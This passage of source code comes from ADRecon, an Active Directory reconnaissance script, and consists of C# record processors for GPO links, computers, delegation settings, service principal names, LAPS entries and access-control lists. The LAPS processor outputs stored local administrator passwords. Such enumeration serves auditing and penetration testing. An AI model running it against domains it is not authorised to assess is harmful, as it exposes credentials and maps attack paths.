                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
